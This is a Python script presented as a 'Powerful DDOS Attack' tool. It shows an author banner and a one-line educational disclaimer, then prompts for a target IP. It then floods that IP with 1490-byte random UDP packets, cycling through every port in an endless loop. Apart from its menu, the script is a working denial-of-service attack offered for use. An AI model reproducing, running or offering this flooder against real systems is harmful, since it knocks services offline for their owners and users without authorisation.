import socket
import random
import sys
import os
import time

# Functions
def animation_text(text, delay):
    for i in text:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(delay)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

# Logo
logo = """
\033[1;34m================================================


      ____  ___ _______     _____ 
     |  _ \\|_ _|__  /\\ \\   / /_ _|
     | |_) || |  / /  \\ \\ / / | | 
     |  _ < | | / /_   \\ V /  | | 
     |_| \\_\\___/____|   \\_/  |___|
                        


        \033[1;32mAuthor   : Rizvi Ahmed
        Facebook : www.facebook.com/rijuorsiam 
        Github   : www.github.com/ahmedrizvisiam
        Group    : STLP TEAM

        Use the tool for Educational Purpose

\033[1;34m================================================\033[0m
"""

first_line = """\033[1;32m
------------------------------------------------
|                                              |
|          Powerful DDOS Attack                |
|                                              |
------------------------------------------------\n\n\033[0m"""

# Main Program
clear()
animation_text(logo, 0.01)
animation_text(first_line, 0.01)

option = "\n\n\t\033[1;35m1. Start DDOS Attack\n\n\t2. Exit\n\033[0m"
animation_text(option, 0.1)

choice = input("\n\n\tEnter your choice: ").strip()

if choice == "1":
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byte_data = random._urandom(1490)

    ip = input("\n\tEnter target IP: ").strip()
    port = 1
    sent = 0

    while True:
        sock.sendto(byte_data, (ip, port))
        sent += 1
        print_line = f"\t\033[1;32mPacket #{sent} sent successfully to {ip} through port {port}\033[0m\n"
        animation_text(print_line, 0.001)

        port += 1
        if port > 65535:
            port = 1

elif choice == "2":
    print("\n\033[1;31mExiting...\033[0m")
    time.sleep(1)
else:
    print("\n\033[1;31mInvalid choice!\033[0m")
